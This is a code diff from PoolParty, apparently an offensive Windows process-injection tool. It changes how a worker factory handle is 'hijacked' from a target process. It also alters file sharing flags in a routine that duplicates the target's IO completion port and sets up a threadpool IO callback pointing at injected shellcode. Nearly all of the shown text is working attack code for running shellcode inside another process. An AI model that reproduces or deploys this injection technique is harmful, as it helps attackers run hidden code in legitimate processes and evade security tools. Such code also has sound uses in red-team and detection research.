@@ -19,8 +19,8 @@ std::shared_ptr<HANDLE> PoolParty::GetTargetProcessHandle() {
 }
 
 std::shared_ptr<HANDLE> PoolParty::GetWorkerFactoryHandle() {
-	WorkerFactoryHandleDuplicator Duplicator{ m_dwTargetPid, *m_p_hTargetPid };
-	auto p_hWorkerFactory = Duplicator.Duplicate(WORKER_FACTORY_ALL_ACCESS);
+	WorkerFactoryHandleHijacker Hijacker{ m_dwTargetPid };
+	auto p_hWorkerFactory = Hijacker.Hijack(WORKER_FACTORY_ALL_ACCESS);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Hijacked worker factory handle from the target process: %x") % *p_hWorkerFactory;
 	return p_hWorkerFactory;
 }
@@ -177,7 +177,7 @@ void RemoteIoCompletionCallbackInsertion::SetupExecution()
 	auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port :%d") % *p_hIoCompletion;
 
-	auto p_hFile = w_CreateFile(POOL_PARTY_FILE_NAME, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
+	auto p_hFile = w_CreateFile(POOL_PARTY_FILE_NAME, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Created file: `%ws`") % POOL_PARTY_FILE_NAME;
 
 	auto pTpIo = w_CreateThreadpoolIo(*p_hFile, (PTP_WIN32_IO_CALLBACK)m_ShellcodeAddress, NULL, NULL);
